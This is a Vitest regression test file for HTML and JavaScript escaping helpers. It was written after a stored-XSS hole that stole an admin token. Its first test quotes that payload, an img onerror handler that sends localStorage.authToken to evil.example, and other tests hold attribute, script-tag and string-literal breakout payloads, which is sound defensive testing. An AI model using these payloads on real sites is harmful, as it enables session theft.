import { describe, expect, it } from "vitest";

import { escapeHtml, escapeJsString, html, raw } from "./escapeHtml";

/**
 * V-13 regression tests.
 *
 * Every case below is written against the ACTUAL payloads that worked on the
 * original application, so a future refactor that reintroduces the hole fails
 * here rather than in production.
 */
describe("escapeHtml", () => {
  it("neutralises the stored-XSS payload that stole the admin token", () => {
    // The exact payload: saved as a customer name, it fired when an
    // administrator printed the invoice, and exfiltrated localStorage.authToken.
    const payload =
      `<img src=x onerror="fetch('https://evil.example/?t='+localStorage.authToken)">`;

    const escaped = escapeHtml(payload);

    // What matters is that no tag and no attribute can form. The substring
    // "onerror=" survives as inert TEXT, which is harmless and is the correct
    // behaviour - a customer really could be named that. The guarantee is
    // structural: not one of the characters that create markup is left raw.
    expect(escaped).not.toMatch(/[<>"']/);

    expect(escaped).toContain("&lt;img");
    expect(escaped).toContain("&quot;");
    expect(escaped).toContain("&#39;");

    // Round-tripping through a parser is the real proof: the browser must see
    // one text node and zero elements.
    const host = document.createElement("div");
    host.innerHTML = `<div class="product-name">${escaped}</div>`;

    expect(host.querySelectorAll("img")).toHaveLength(0);
    expect(host.querySelector(".product-name").textContent).toBe(payload);
  });

  it("escapes all five significant characters", () => {
    expect(escapeHtml(`<>&"'`)).toBe("&lt;&gt;&amp;&quot;&#39;");
  });

  it("escapes & first so entities are not double-escaped", () => {
    // If & were replaced last, "<" would become "&lt;" and then "&amp;lt;",
    // which renders as the literal text "&lt;" instead of a "<".
    expect(escapeHtml("<")).toBe("&lt;");
    expect(escapeHtml("&lt;")).toBe("&amp;lt;");
  });

  it("closes attribute-context breakout, not just tag context", () => {
    // Escaping only < > & would leave this able to add an event handler to an
    // existing element: <div title="${value}">
    const value = `" onmouseover="alert(1)`;

    expect(escapeHtml(value)).not.toContain('"');
    expect(escapeHtml(value)).toBe("&quot; onmouseover=&quot;alert(1)");
  });

  it("blocks a </script> breakout", () => {
    expect(escapeHtml("</script><script>alert(1)</script>"))
      .not.toContain("<script");
  });

  it("returns an empty string for null and undefined rather than 'null'", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });

  it("passes ordinary business data through unharmed", () => {
    expect(escapeHtml("Michelin Primacy 4 205/55R16")).toBe(
      "Michelin Primacy 4 205/55R16"
    );
    expect(escapeHtml("Ajith Kumara")).toBe("Ajith Kumara");
    expect(escapeHtml(32000)).toBe("32000");
  });

  it("handles a name that legitimately contains an ampersand", () => {
    expect(escapeHtml("Perera & Sons (Pvt) Ltd")).toBe(
      "Perera &amp; Sons (Pvt) Ltd"
    );
  });
});

describe("html tagged template", () => {
  it("escapes interpolated values automatically", () => {
    const name = "<script>alert(1)</script>";

    expect(html`<div>${name}</div>`).toBe(
      "<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>"
    );
  });

  it("leaves the literal chunks alone", () => {
    expect(html`<div class="x">${"hi"}</div>`).toBe('<div class="x">hi</div>');
  });

  it("allows explicitly trusted markup through raw()", () => {
    expect(html`<div>${raw("<b>bold</b>")}</div>`).toBe("<div><b>bold</b></div>");
  });

  it("does not treat a plain object as trusted", () => {
    // Only raw() sets __rawHtml; an attacker-controlled value that happens to
    // be an object must still be stringified and escaped.
    expect(html`${{ value: "<b>" }}`).not.toContain("<b>");
  });
});

describe("escapeJsString", () => {
  it("prevents a string-literal breakout", () => {
    expect(escapeJsString(`'; alert(1); //`)).toBe(`\\'; alert(1); //`);
  });

  it("escapes the script-closing sequence", () => {
    expect(escapeJsString("</script>")).not.toContain("</script>");
  });

  it("escapes U+2028 and U+2029, which terminate a JS string", () => {
    expect(escapeJsString("a b")).toBe("a\\u2028b");
    expect(escapeJsString("a b")).toBe("a\\u2029b");
  });
});
